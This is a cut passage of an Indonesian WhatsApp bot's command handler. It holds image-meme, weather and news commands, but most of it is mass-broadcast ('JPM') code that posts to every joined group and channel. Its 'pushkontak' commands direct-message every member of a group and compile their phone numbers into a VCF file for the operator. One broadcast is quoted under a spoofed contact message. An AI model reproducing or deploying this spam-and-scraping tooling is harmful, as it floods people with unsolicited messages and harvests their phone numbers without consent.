    wrappedLines.forEach((line, i) => {
      const y = startY + (i * lineHeight)
      if (y > BOX_Y + BOX_H - lineHeight) return
      ctx.fillText(line, TEXT_X, y)
    })
    ctx.restore()

    const buffer = canvas.toBuffer('image/jpeg', { quality: 0.95 })

    await reyz.sendMessage(m.chat, {
      image: buffer,
      caption: '🎵 Fake Windows Media Player — ReyzTzx'
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e)
    reply('❌ Error fakewindos')
  }
}
break

case 'fakewindos2':
case 'fakewindows2': {
  try {
    if (!text) return example(`Kenapa ya yang tulus sering kalah`)

    const kata = text.trim().split(/\s+/)
    let linesWin2 = []
    if (kata.length <= 5) {
      linesWin2 = kata
    } else {
      for (let i = 0; i < kata.length; i += 2) linesWin2.push(kata.slice(i, i + 2).join(' '))
    }

    const { createCanvas, loadImage } = require('canvas')
    const bg = await loadImage('https://api.nexadev.my.id/uploder/uploads/TyIyEi.jpg')
    const W = bg.width
    const H = bg.height

    const canvas = createCanvas(W, H)
    const ctx = canvas.getContext('2d')
    ctx.drawImage(bg, 0, 0, W, H)

    const AREA_X = W * 0.09
    const AREA_Y = H * 0.33
    const AREA_W = W * 0.33
    const AREA_H = H * 0.40

    let fontSize = Math.floor(H * 0.065)
    ctx.fillStyle = '#000000'
    ctx.textAlign = 'left'
    ctx.textBaseline = 'middle'

    while (fontSize > 25) {
      ctx.font = `bold ${fontSize}px Arial`
      const widest = Math.max(...linesWin2.map(v => ctx.measureText(v).width))
      if (widest <= AREA_W) break
      fontSize -= 2
    }

    ctx.font = `bold ${fontSize}px Arial`
    const lineHeight = fontSize * 1.18
    const totalHeight = (linesWin2.length - 1) * lineHeight
    const startY = AREA_Y + (AREA_H / 2) - (totalHeight / 2)

    linesWin2.forEach((line, i) => {
      ctx.fillText(line, AREA_X, startY + (i * lineHeight))
    })

    const buffer = canvas.toBuffer('image/jpeg')

    await reyz.sendMessage(m.chat, {
      image: buffer,
      caption: 'Fake Windows Media Player V2 — ReyzTzx'
    }, { quoted: qR9X })
  } catch (e) {
    console.error(e)
    reply('❌ Gagal membuat gambar.')
  }
}
break

case 'cuaca': {
  if (!text) return example(`tanjungbalai`)

  try {
    let { data } = await axios.get(`https://api.synoxcloud.xyz/search/cuaca?kota=${encodeURIComponent(text)}`)
    if (!data.status) return reply('❌ Data cuaca tidak ditemukan')

    let res = data.data
    let cuaca = {
      0: 'Cerah', 1: 'Cerah Berawan', 2: 'Sebagian Berawan', 3: 'Berawan',
      45: 'Berkabut', 48: 'Kabut Tebal', 51: 'Gerimis Ringan', 53: 'Gerimis Sedang',
      55: 'Gerimis Lebat', 61: 'Hujan Ringan', 63: 'Hujan Sedang', 65: 'Hujan Lebat',
      71: 'Salju Ringan', 73: 'Salju Sedang', 75: 'Salju Lebat', 80: 'Hujan Lokal Ringan',
      81: 'Hujan Lokal Sedang', 82: 'Hujan Lokal Lebat', 95: 'Badai Petir'
    }

    let caption = `🌦️ *INFO CUACA*\n\n`
    caption += `🏙️ Kota : ${res.kota}\n`
    caption += `🌍 Negara : ${res.negara}\n`
    caption += `🌡️ Suhu : ${res.suhu_celsius}°C\n`
    caption += `💨 Angin : ${res.kecepatan_angin_kmh} km/j\n`
    caption += `☁️ Kondisi : ${cuaca[res.kode_cuaca] || res.kode_cuaca}\n`
    caption += `🕒 Waktu : ${res.waktu}\n`

    reply(caption)
  } catch (e) {
    console.error(e)
    reply('❌ Gagal mengambil data cuaca')
  }
}
break

case 'detikcom': {
  try {
    await reyz.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

    const { data } = await axios.get("https://api.synoxcloud.xyz/berita/detik")

    if (!data || data.statusCode !== 200 || !data.result) return reply("❌ API tidak mengembalikan data yang valid.")

    const berita = data.result
    if (!Array.isArray(berita) || berita.length === 0) return reply("❌ Tidak ada berita yang tersedia saat ini.")

    let teks = `📰 *DETIKCOM NEWS UPDATE*\n`
    teks += `━━━━━━━━━━━━━━━\n\n`

    berita.slice(0, 10).forEach((item, i) => {
      const title = item.title || "No Title"
      const link = item.link || "-"
      const time = item.time ? `⏰ ${item.time}\n` : ""
      teks += `*${i + 1}. ${title}*\n${time}🔗 ${link}\n\n`
    })

    teks += `━━━━━━━━━━━━━━━\n📊 Total Berita: ${data.total || berita.length}`

    reply(teks)
  } catch (e) {
    console.error("Error detikcom:", e)
    reply("❌ Gagal mengambil berita (API error / koneksi gagal).")
  }
}
break

//——————————[ Case Fitur Broadcast ]——————————//
case "autojpm": {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()

  let [cmd, ...args] = text.split(" ")
  cmd = cmd ? cmd.toLowerCase() : null

  if (!cmd) {
    let list = penting.autoJpm.messages.map((m, i) => `${i + 1}. ${m.caption || m.text || "(media tanpa teks)"}`).join("\n") || "- kosong -"
    return reply(
`*AUTO JPM SYSTEM*

Status: ${penting.autoJpm.status ? "ON" : "OFF"}
Interval: ${penting.autoJpm.interval} ${penting.autoJpm.type}
Pesan tersimpan:
${list}

Command:
.autojpm on
.autojpm off
.autojpm add <teks/caption> (reply gambar/video jika ada media)
.autojpm del <nomor/all>
.autojpm set <angka> menit/jam/hari`
    )
  }

  if (cmd === "on") {
    if (penting.autoJpm.status) return reply("✖️ Auto JPM sudah aktif.")
    if (!penting.autoJpm.interval || !penting.autoJpm.messages.length) {
      return reply("✖️ Set interval dan tambah pesan dulu!")
    }
    penting.autoJpm.status = true
    savePenting()
    reply("✅ Auto JPM berhasil diaktifkan.")
  }

  else if (cmd === "off") {
    penting.autoJpm.status = false
    savePenting()
    reply("✅ Auto JPM dimatikan.")
  }

  else if (cmd === "add") {
  let qmsg = m.quoted ? m.quoted : m
  let mime = (qmsg.msg || qmsg).mimetype || ''
  let caption = args.join(" ")
  let tmpDir = path.join(process.cwd(), "tmp", "autojpm")
  if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir, { recursive: true })

  if (/image|video/.test(mime)) {
    let ext = mime.split("/")[1] || "bin"
    let fileName = `autojpm_${Date.now()}_${Math.floor(Math.random() * 10000)}.${ext}`
    let filePath = path.join(tmpDir, fileName)

    let buffer = await qmsg.download()
    fs.writeFileSync(filePath, buffer)

    penting.autoJpm.messages.push({
      type: /image/.test(mime) ? "image" : "video",
      path: filePath,
      caption
    })
  } else {
    penting.autoJpm.messages.push({
      type: "text",
      text: caption
    })
  }
  penting.autoJpm._lastRun = 0

  savePenting()
  reply("✅ Pesan berhasil ditambahkan ke Auto JPM.")
}

  else if (cmd === "del") {
    let idx = args[0]
    if (!idx) return reply("✖️ Masukkan nomor pesan atau 'all'.")
    if (idx === "all") {
      penting.autoJpm.messages = []
    } else {
      idx = parseInt(idx) - 1
      if (isNaN(idx) || idx < 0 || idx >= penting.autoJpm.messages.length) {
        return reply("✖️ Nomor tidak valid.")
      }
      penting.autoJpm.messages.splice(idx, 1)
    }
    savePenting()
    reply("✅ Pesan berhasil dihapus.")
  }

  else if (cmd === "set") {
    let num = parseInt(args[0])
    let unit = (args[1] || "").toLowerCase()
    if (isNaN(num) || num <= 0) return reply("✖️ Masukkan angka yang valid.")
    if (!["menit","jam","hari","minute","hour","day"].includes(unit)) {
      return reply("✖️ Gunakan satuan menit/jam/hari.")
    }

    penting.autoJpm.interval = num
    penting.autoJpm.type = unit.startsWith("m") ? "minute" : unit.startsWith("j") ? "hour" : "day"
    savePenting()
    reply(`✅ Interval diatur ke ${num} ${penting.autoJpm.type}.`)
  }
}
break
case 'bcgc':
case 'bcgroup': {
if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
if (!text) return example(`teksnya`)
  let getGroups = await reyz.groupFetchAllParticipating()
  let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
  let anu = groups.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(global.delayJpm)
  let a = '```' + `\n\n${text}\n\n` + '```' + '\n\n\nʙʀᴏᴀᴅᴄᴀsᴛ'
reyz.sendMessage(i, {
  text: a,
   contextInfo: {
            externalAdReply: {
            title: `Broadcast By ${namabot}`,
            body: `Telah Terkirim ${i.length} Group`,
            thumbnailUrl: R9XImgw,
            sourceUrl: "https://whatsapp.com/channel/0029VbCZ37w9MF92NBQnfU3G",
            mediaType: 1,
            renderLargerThumbnail: true
                            }
                        }
                    })
                }
reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case "bljpm": {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();

  // path database
  const pentingPath = path.join(process.cwd(), "database", "penting.json");
  if (!fs.existsSync(pentingPath)) {
    fs.writeFileSync(pentingPath, JSON.stringify({ blacklistJpm: [] }, null, 2));
  }
  let penting = JSON.parse(fs.readFileSync(pentingPath));
  function savePenting() {
    fs.writeFileSync(pentingPath, JSON.stringify(penting, null, 2));
  }

  let [act, arg] = text.split("|").map(a => a?.trim()?.toLowerCase());

  if (m.isGroup) {
    const gid = m.chat;
    if (act === "on") {
      if (!penting.blacklistJpm.includes(gid)) {
        penting.blacklistJpm.push(gid);
        savePenting();
        return reply(`✅ Grup ini berhasil ditambahkan ke *Blacklist JPM*.`);
      } else return reply(`✖️ Grup ini sudah ada di daftar blacklist.`);
    } else if (act === "off") {
      if (penting.blacklistJpm.includes(gid)) {
        penting.blacklistJpm = penting.blacklistJpm.filter(x => x !== gid);
        savePenting();
        return reply(`✅ Grup ini berhasil dihapus dari *Blacklist JPM*.`);
      } else return reply(`✖️ Grup ini belum ada di daftar blacklist.`);
    } else return reply(`Gunakan:\n.bljpm on\n.bljpm off`);
  }

  // === kalau perintah dipakai di CHANNEL ===
  if (m.chat.endsWith("@newsletter")) {
    const cid = m.chat;
    if (act === "on") {
      if (!penting.blacklistJpm.includes(cid)) {
        penting.blacklistJpm.push(cid);
        savePenting();
        return reply(`✅ Channel ini berhasil ditambahkan ke *Blacklist JPM*.`);
      } else return reply(`✖️ Channel ini sudah ada di daftar blacklist.`);
    } else if (act === "off") {
      if (penting.blacklistJpm.includes(cid)) {
        penting.blacklistJpm = penting.blacklistJpm.filter(x => x !== cid);
        savePenting();
        return reply(`✅ Channel ini berhasil dihapus dari *Blacklist JPM*.`);
      } else return reply(`✖️ Channel ini belum ada di daftar blacklist.`);
    } else return reply(`Gunakan:\n.bljpm on\n.bljpm off`);
  }

  // === kalau perintah dipakai di PRIVATE CHAT ===
  if (!m.isGroup && !m.chat.endsWith("@newsletter")) {
    const allGroups = await reyz.groupFetchAllParticipating();
    const groupIDs = Object.keys(allGroups);
    const allChannels = await reyz.newsletterFetchAllParticipating();
    const channelIDs = Object.keys(allChannels);

    if (!groupIDs.length && !channelIDs.length)
      return reply("✖️ Tidak ada grup atau channel yang diikuti bot.");

    // tampilkan daftar kalau tidak ada argumen
    if (!act) {
      let listText = `*📋 Daftar Grup & Channel Bot:*\n\n`;

      // grup section
      listText += `*🧩 Grup:*\n`;
      groupIDs.forEach((id, i) => {
        const isBl = penting.blacklistJpm.includes(id);
        listText += `${i + 1}. ${allGroups[id].subject} ${isBl ? "(BL)" : ""}\n`;
      });

      // channel section
      if (channelIDs.length) {
        listText += `\n*📢 Channel:*\n`;
        channelIDs.forEach((id, i) => {
          const index = groupIDs.length + i + 1;
          const name = allChannels[id]?.name || "Tanpa Nama";
          const isBl = penting.blacklistJpm.includes(id);
          listText += `${index}. ${name} ${isBl ? "(BL)" : ""}\n`;
        });
      }

      listText += `\nGunakan:\n.bljpm on|1,3\n.bljpm off|2\n\nNomor sesuai urutan di atas.`;
      return reply(listText);
    }

    const idxList = arg.split(",").map(x => parseInt(x.trim()) - 1);
    const isOn = act === "on";
    const isOff = act === "off";
    let hasil = [];

    const combined = [...groupIDs, ...channelIDs];
    for (const idx of idxList) {
      if (isNaN(idx) || idx < 0 || idx >= combined.length) continue;
      const targetID = combined[idx];
      const isChannel = targetID.endsWith("@newsletter");

      if (isOn) {
        if (!penting.blacklistJpm.includes(targetID)) {
          penting.blacklistJpm.push(targetID);
          hasil.push(`✅ ${isChannel ? "Channel" : "Grup"} *${isChannel ? allChannels[targetID]?.name : allGroups[targetID]?.subject}* ditambahkan ke blacklist.`);
        } else {
          hasil.push(`⚠️ ${isChannel ? "Channel" : "Grup"} *${isChannel ? allChannels[targetID]?.name : allGroups[targetID]?.subject}* sudah ada di blacklist.`);
        }
      } else if (isOff) {
        if (penting.blacklistJpm.includes(targetID)) {
          penting.blacklistJpm = penting.blacklistJpm.filter(x => x !== targetID);
          hasil.push(`✅ ${isChannel ? "Channel" : "Grup"} *${isChannel ? allChannels[targetID]?.name : allGroups[targetID]?.subject}* dihapus dari blacklist.`);
        } else {
          hasil.push(`⚠️ ${isChannel ? "Channel" : "Grup"} *${isChannel ? allChannels[targetID]?.name : allGroups[targetID]?.subject}* belum ada di blacklist.`);
        }
      }
    }

    savePenting();
    if (!hasil.length) return reply("✖️ Tidak ada ID yang valid.");
    return reply(hasil.join("\n"));
  }
}
break
case 'cekidgc': case 'getidgrup': {
   if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
   if (!q) return example(`link grupnya`)
   let linkRegex = args.join(" ")
   let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
   if (!coded) return reply("Link Invalid")

   try {
      let res = await reyz.groupGetInviteInfo(coded)
      let tekse = res.id ? res.id : "undefined"
      reply(tekse)
   } catch (e) {
      console.log(e)
      reply("❌ Gagal mengambil ID grup, mungkin link invalid / sesi error")
   }
}
break
case "jpm": {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  if (!text && !m.quoted) return example(`Halo semua!\nKirim media + caption (opsional)`)

  let mediaPath, broadcastMsg
  if (/image|video|audio|document/.test(mime)) {
    mediaPath = await reyz.downloadAndSaveMediaMessage(qmsg)
  }

  const allGroups = await reyz.groupFetchAllParticipating()
  const groupIDs = Object.keys(allGroups)
  let sentCount = 0

  if (mediaPath) {
    if (/image/.test(mime)) broadcastMsg = { image: fs.readFileSync(mediaPath), caption: text || "" }
    if (/video/.test(mime)) broadcastMsg = { video: fs.readFileSync(mediaPath), caption: text || "" }
    if (/audio/.test(mime)) broadcastMsg = { audio: fs.readFileSync(mediaPath), mimetype: "audio/mpeg", ptt: true }
    if (/document/.test(mime)) broadcastMsg = { document: fs.readFileSync(mediaPath), mimetype: qmsg.mimetype, fileName: `file_${Date.now()}` }
  } else {
    broadcastMsg = { text }
  }

  const processMsg = await reyz.sendMessage(
  m.chat,
  {
    text: `⏳ *Memproses JPM...*\nJumlah grup: ${groupIDs.length}\nTipe: ${mediaPath ? mime : "Text"}`
  },
  { quoted: qR9X }
)

  for (const id of groupIDs) {
    if (penting.blacklistJpm.includes(id)) continue
    try {
      await reyz.sendMessage(id, broadcastMsg, { quoted: qR9X })
      sentCount++
    } catch {}
    await sleep(global.delayJpm || 4000)
  }

  if (mediaPath) fs.unlinkSync(mediaPath)

  await reyz.sendMessage(
  m.chat,
  {
    text: `✅ *JPM Selesai!*\nBerhasil terkirim ke *${sentCount}* grup dari total ${groupIDs.length}.`,
    edit: processMsg.key
  }
)
}
break

case "jpmht": {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  if (!text && !m.quoted) return example(`Halo semua!\nKirim media + caption (opsional)`)

  let mediaPath, msgContent
  if (/image|video|audio|document/.test(mime)) {
    mediaPath = await reyz.downloadAndSaveMediaMessage(qmsg)
  }

  const allGroups = await reyz.groupFetchAllParticipating()
  const groupIDs = Object.keys(allGroups)
  let sentCount = 0

  const processMsg = await reyz.sendMessage(
  m.chat,
  {
    text: `⏳ *Memproses Broadcast Hidetag...*\nJumlah grup: ${groupIDs.length}\nTipe: ${mediaPath ? mime : "Text"}`
  },
  { quoted: qR9X }
)

  for (const id of groupIDs) {
    if (penting.blacklistJpm.includes(id)) continue
    const metadata = await reyz.groupMetadata(id)
    const participants = metadata.participants.map(p => p.id)

    if (mediaPath) {
      if (/image/.test(mime)) msgContent = { image: fs.readFileSync(mediaPath), caption: text || "", mentions: participants }
      if (/video/.test(mime)) msgContent = { video: fs.readFileSync(mediaPath), caption: text || "", mentions: participants }
      if (/audio/.test(mime)) msgContent = { audio: fs.readFileSync(mediaPath), mimetype: "audio/mpeg", ptt: true, mentions: participants }
      if (/document/.test(mime)) msgContent = { document: fs.readFileSync(mediaPath), mimetype: qmsg.mimetype, fileName: `file_${Date.now()}`, mentions: participants }
    } else {
      msgContent = { text: text, mentions: participants }
    }

    try {
      await reyz.sendMessage(id, msgContent, { quoted: qR9X })
      sentCount++
    } catch {}
    await sleep(global.delayJpm || 4000)
  }

  if (mediaPath) fs.unlinkSync(mediaPath)

  await reyz.sendMessage(
  m.chat,
  {
    text: `✅ *Hidetag Broadcast Selesai!*\nBerhasil terkirim ke *${sentCount}* grup dari total ${groupIDs.length}.`,
    edit: processMsg.key
  }
)
}
break
case "jpmch": {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang()
  if (!text && !m.quoted) return example(`Halo semua!\nKirim media + caption (opsional)`)

  const qmsg = m.quoted ? m.quoted : m
  const mime = (qmsg.msg || qmsg).mimetype || ""
  let mediaPath, broadcastMsg

  if (/image|video|audio|document/.test(mime)) {
    mediaPath = await reyz.downloadAndSaveMediaMessage(qmsg)
  }

  const allCh = await reyz.newsletterFetchAllParticipating()
  const chIDs = Object.keys(allCh)

  let validChannels = []
  for (const id of chIDs) {
    const ch = allCh[id]
    if (
      ch &&
      ch.state === "ACTIVE" &&
      ch.viewer_metadata &&
      ch.viewer_metadata.role === "ADMIN" &&
      !penting.blacklistJpm.includes(id)
    ) {
      validChannels.push(id)
    }
  }

  if (validChannels.length === 0) {
    return reply(`❌ Tidak ada channel aktif yang memenuhi kriteria (role: admin, mute: off, tidak di blacklist).`)
  }

  // Buat pesan sesuai tipe
  if (mediaPath) {
    if (/image/.test(mime)) broadcastMsg = { image: fs.readFileSync(mediaPath), caption: text || "" }
    if (/video/.test(mime)) broadcastMsg = { video: fs.readFileSync(mediaPath), caption: text || "" }
    if (/audio/.test(mime)) broadcastMsg = { audio: fs.readFileSync(mediaPath), mimetype: "audio/mpeg", ptt: true }
    if (/document/.test(mime)) {
      broadcastMsg = {
        document: fs.readFileSync(mediaPath),
        mimetype: qmsg.mimetype,
        fileName: `file_${Date.now()}`
      }
    }
  } else {
    broadcastMsg = { text }
  }

  const qmeta = {
    key: {
      participant: `13135550002@s.whatsapp.net`,
      ...(botNumber ? { remoteJid: `status@broadcast` } : {})
    },
    message: {
      contactMessage: {
        displayName: `R9X WaBot Botz JPM Channel: ${mediaPath ? mime : "Text"}`,
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=13135550002:+62 852-9802-7445\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
        sendEphemeral: true
      }
    }
  }

  const processMsg = await reyz.sendMessage(
    m.chat,
    {
      text: `⏳ *Memproses JPM Channel...*\nJumlah Channel: ${validChannels.length}\nTipe: ${mediaPath ? mime : "Text"}`
    },
    { quoted: qR9X }
  )

  let sentCount = 0
  for (const id of validChannels) {
    try {
      await reyz.sendMessage(id, broadcastMsg, { quoted: qmeta })
      sentCount++
    } catch (e) {
      console.log(`[Gagal kirim ke CH] ${id}`, e)
    }
    await sleep(global.delayJpm || 4000)
  }

  if (mediaPath) fs.unlinkSync(mediaPath)

  await reyz.sendMessage(
    m.chat,
    {
      text: `✅ *JPM Channel Selesai!*\nBerhasil terkirim ke *${sentCount}* channel dari total ${validChannels.length}.`,
      edit: processMsg.key
    }
  )
}
break
case 'listgc':
case 'listgrup': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
  
  await reyz.sendMessage(m.chat, { react: { text: '☘️', key: m.key } });

  let gcall;
  try {
    gcall = Object.values(await reyz.groupFetchAllParticipating());
  } catch (e) {
    return reply("*✖️ Gagal mengambil daftar grup.*");
  }

  let teks = `*📦 Daftar Grup Terkait (${gcall.length} Grup):*\n\n`;
  gcall.forEach((group, index) => {
    teks += `*${index + 1}. ${group.subject}*\n`;
    teks += `├ ID: ${group.id}\n`;
    teks += `├ Member: ${group.participants.length}\n`;
    teks += `├ Status: ${group.announce ? "🔒 Tertutup" : "🔓 Terbuka"}\n`;
    teks += `└ Pembuat: ${group.owner ? "@" + group.owner.split('@')[0] : '✖️ Tidak Diketahui'}\n\n`;
  });

  reyz.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        title: `${gcall.length} Grup Aktif`,
        body: `Runtime : ${runtime(process.uptime())}`,
        sourceUrl: "t.me/reyztzx",
        thumbnail: R9XImgw,
        mediaType: 1,
        renderLargerThumbnail: true
      }
    }
  }, { quoted: qR9X });
}
break

//——————————[ Case Fitur Push kontak ]——————————//
case 'pushkontak': {
  if (!isGroup) return reply("Pakai Fitur Ini Di Group.");
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();

  const groupMetadata = await reyz.groupMetadata(from);
  const participants = groupMetadata.participants;

  if (!text) return example('Save Namaku!');

  const pesan = text.trim();
  let success = 0;
  let failed = 0;
  const total = participants.length;

  const progMsg = await reyz.sendMessage(m.chat, {
    text: `*⏳ Memulai push kontak...*\nTarget: ${total} kontak\n\n⚠️ Jangan spam atau pakai command berat (seperti JPM) selama push berlangsung!`
  }, { quoted: qR9X });

  for (let i = 0; i < participants.length; i++) {
    const member = participants[i];
    try {
      await reyz.sendMessage(member.id, { text: pesan }, { quoted: qR9X });
      success++;
    } catch {
      failed++;
    }
    await sleep(global.delayPushkontak);

    // Update progres tiap 20%
    const percent = Math.floor(((i + 1) / total) * 100);
    if (percent % 20 === 0 || i + 1 === total) {
      const bar = makeProgressBar(i + 1, total);
      await reyz.sendMessage(m.chat, {
        text: `*Progres Push Kontak*\n${i + 1}/${total} kontak\n${bar}\n\n⚠️ Jangan spam atau jalankan command lain dulu.`
      }, { edit: progMsg.key });
    }
  }

  await reyz.sendMessage(m.chat, {
    text: `*✅ Push Kontak Selesai!*\n\nTotal: ${total}\nBerhasil: ${success}\nGagal: ${failed}\n\n_(Opsional: pakai *.savekontak* untuk simpan kontak)_`
  }, { quoted: qR9X });
}
break

case 'pushkontak2': {
  if (!isGroup) return reply("Pakai Fitur Ini Di Group.");
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();

  const groupMetadata = await reyz.groupMetadata(from);
  const participants = groupMetadata.participants || [];

  if (!text) return example('Save Namaku!');

  const pesan = text.trim();
  let success = 0;
  let failed = 0;
  const total = participants.length;
  let vcfList = '';

  const progMsg = await reyz.sendMessage(m.chat, {
    text: `*⏳ Memulai push kontak (mode VCF)...*\nTarget: ${total} kontak\n\n⚠️ Jangan spam atau pakai command berat selama push berlangsung!`
  }, { quoted: qR9X });

  for (let i = 0; i < participants.length; i++) {
    const member = participants[i];
    try {
      // kirim pesan tetap pakai id (lid aman)
      await reyz.sendMessage(member.id, { text: pesan }, { quoted: qR9X });
      success++;

      // simpan kontak pakai phoneNumber
      if (member.phoneNumber) {
        const nomor = member.phoneNumber.split('@')[0];
        vcfList += `BEGIN:VCARD
VERSION:3.0
FN:${global.namakontak || 'Contact'} - ${nomor}
TEL;type=CELL;type=VOICE;waid=${nomor}:+${nomor}
END:VCARD

`;
      }

    } catch {
      failed++;
    }

    await sleep(global.delayPushkontak || 1500);

    // Update progres tiap 20%
    const percent = Math.floor(((i + 1) / total) * 100);
    if (percent % 20 === 0 || i + 1 === total) {
      const bar = makeProgressBar(i + 1, total);
      await reyz.sendMessage(m.chat, {
        text: `*Progres Push Kontak (VCF)*\n${i + 1}/${total} kontak\n${bar}\n\n⚠️ Jangan jalankan command berat lain dulu.`
      }, { edit: progMsg.key });
    }
  }

  // Simpan file VCF
  const vcfPath = `./database/contacts.vcf`;
  fs.writeFileSync(vcfPath, vcfList);

  await reyz.sendMessage(m.sender, {
    document: fs.readFileSync(vcfPath),
    fileName: `KontakGrup-${groupMetadata.subject}.vcf`,
    mimetype: 'text/x-vcard',
    caption: `*Push Kontak Selesai!*\nGrup: ${groupMetadata.subject}\nTotal: ${total}\nBerhasil: ${success}\nGagal: ${failed}`
  }, { quoted: qR9X });

  fs.unlinkSync(vcfPath);
}
break

case 'pushkontak3': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
  if (!text.includes('|')) return example(`jeda(ms)|pesan\n\n*Contoh:* 1000|Halo semua`);

  const [jedaStr, ...pesanArr] = text.split('|');
  const delay = Number(jedaStr.trim());
  const pesan = pesanArr.join('|').trim();
  if (isNaN(delay) || !pesan) return reply("Format salah!");

  const groupMetadata = await reyz.groupMetadata(m.chat);
  const participants = groupMetadata.participants || [];
  const total = participants.length;

  let success = 0, failed = 0;
  let vcfList = '';

  const progMsg = await reyz.sendMessage(m.chat, {
    text: `*⏳ Broadcast dimulai...*\nTarget: ${total} kontak\nDelay: ${delay}ms\n\n⚠️ Jangan spam/jalankan command lain dulu.`
  }, { quoted: qR9X });

  for (let i = 0; i < participants.length; i++) {
    const member = participants[i];
    try {
      await reyz.sendMessage(member.id, { text: pesan }, { quoted: qR9X });
      success++;
      if (member.phoneNumber) {
        const nomor = member.phoneNumber.split('@')[0];
        vcfList += `BEGIN:VCARD
VERSION:3.0
FN:${global.namakontak || 'Contact'} - ${nomor}
TEL;type=CELL;type=VOICE;waid=${nomor}:+${nomor}
END:VCARD

`;
      }

    } catch {
      failed++;
    }

    await sleep(delay);

    // Progress tiap 20%
    const percent = Math.floor(((i + 1) / total) * 100);
    if (percent % 20 === 0 || i + 1 === total) {
      const bar = makeProgressBar(i + 1, total);
      await reyz.sendMessage(m.chat, {
        text: `*Progres Broadcast*\n${i + 1}/${total} kontak\n${bar}\n\n⚠️ Jangan jalankan command berat lain dulu.`
      }, { edit: progMsg.key });
    }
  }

  // Simpan file VCF
  const vcfPath = './database/push_contacts.vcf';
  fs.writeFileSync(vcfPath, vcfList);

  await reyz.sendMessage(m.sender, {
    document: fs.readFileSync(vcfPath),
    mimetype: 'text/x-vcard',
    fileName: 'PushKontak.vcf',
    caption: `*✅ Broadcast selesai!*\nTotal: ${total}\nSukses: ${success}\nGagal: ${failed}`
  }, { quoted: qR9X });

  fs.unlinkSync(vcfPath);
}
break

case 'pushkontakid': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();

  const args = text.split('|');
  if (args.length < 2) return example(`<id_grup>|<pesan>\nKetik *.listgc* untuk menampilkan ID grup`);

  const groupId = args[0].trim();
  const pesan = args[1].trim();

  try {
    const groupMetadata = await reyz.groupMetadata(groupId);
    const participants = groupMetadata.participants;

    let success = 0;
    let failed = 0;
    const total = participants.length;
    let vcfList = '';

    const progMsg = await reyz.sendMessage(m.chat, {
      text: `*⏳ Memulai push kontak...*\nTarget: ${total} anggota di grup *${groupMetadata.subject}*\n\n⚠️ Jangan spam atau jalankan command berat lain selama proses ini.`
    }, { quoted: qR9X });

    for (let i = 0; i < participants.length; i++) {
      const member = participants[i];
      try {
        await reyz.sendMessage(member.id, { text: pesan }, { quoted: qR9X });
        success++;
        if (member.phoneNumber) {
          const nomor = member.phoneNumber.split('@')[0];
          vcfList += `BEGIN:VCARD
VERSION:3.0
FN:${global.namakontak} - ${nomor}
TEL;type=CELL;type=VOICE;waid=${nomor}:+${nomor}
END:VCARD

`;
        }

      } catch {
        failed++;
      }

      await sleep(global.delayPushkontak || 1500);

      const percent = Math.floor(((i + 1) / total) * 100);
      if (percent % 20 === 0 || i + 1 === total) {
        const bar = makeProgressBar(i + 1, total);
        await reyz.sendMessage(m.chat, {
          text: `*Progres Push Kontak*\n${i + 1}/${total} anggota\n${bar}\n\n⚠️ Jangan jalankan command lain dulu.`
        }, { edit: progMsg.key });
      }
    }

    const vcfPath = `./database/contacts.vcf`;
    fs.writeFileSync(vcfPath, vcfList);

    await reyz.sendMessage(m.sender, {
      document: fs.readFileSync(vcfPath),
      fileName: `Kontak-${groupMetadata.subject}.vcf`,
      mimetype: 'text/x-vcard',
      caption: `✅ Pushkontak ke *${total} member* selesai!\nBerhasil: *${success}*\nGagal: *${failed}*`
    });

    fs.unlinkSync(vcfPath);

  } catch (err) {
    console.error(err);
    return reply('❌ Gagal mengambil metadata grup. Pastikan ID grup valid dan bot masih ada di grup.');
  }
}
break

case 'pushkontakid2': {
  if (!isPremium(m.sender) && !isOwner(m.sender)) return larang();
  if (!text.includes('|')) return example(`idgc|jeda(ms)|pesan\n\n*Note:* 1 detik = 1000\nGunakan *.listgc* atau *.cekidgc* untuk melihat id grup`);

  const [idgc, jedaStr, ...pesanArr] = text.split('|');
  const delay = Number(jedaStr.trim());
  const pesan = pesanArr.join('|').trim();

  if (!idgc.endsWith('@g.us')) return reply("❌ ID Grup tidak valid!");
  if (isNaN(delay)) return reply("❌ Format jeda tidak valid!\nGunakan angka (contoh: 1000)");
  if (!pesan) return reply("❌ Pesan tidak boleh kosong!");

  let groupMetadata;
  try {
    groupMetadata = await reyz.groupMetadata(idgc.trim());
  } catch {
    return reply("❌ Gagal ambil metadata grup! Pastikan bot masih ada di grup.");
  }

  const participants = groupMetadata.participants || [];
  const halls = participants.map(p => p.id).filter(Boolean);
  const phoneMap = {};
participants.forEach(p => {
  if (p.id && p.phoneNumber) {
    phoneMap[p.id] = p.phoneNumber;
  }
});

  const contactName = global.namakontak || "R9X WaBot Broadcast";
  let success = 0, failed = 0;
  let contacts = [];

  const progMsg = await reyz.sendMessage(m.chat, {
    text: `*⏳ Broadcast dimulai...*\nTarget: ${halls.length} kontak di grup *${groupMetadata.subject}*\nDelay: ${delay}ms\n\n⚠️ Jangan spam atau pakai command berat lain.`
  }, { quoted: qR9X });

  for (let i = 0; i < halls.length; i++) {
    try {
